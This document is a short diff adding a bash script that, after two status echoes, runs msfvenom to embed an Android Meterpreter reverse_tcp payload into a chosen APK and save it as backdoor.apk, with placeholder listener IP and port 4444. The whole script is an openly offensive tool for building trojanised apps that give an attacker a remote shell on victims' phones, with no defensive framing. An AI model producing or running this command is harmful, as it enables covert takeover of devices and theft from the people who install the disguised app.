@@ -1,0 +1,4 @@
+#!/bin/bash
+echo "SCRIPT IS IN WORK PROGRESS"
+echo "SCRIPT IS EXECUTING NOW"
+msfvenom -x YOURAPKFILELOCATION -p android/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -o /root/Desktop/backdoor.apk
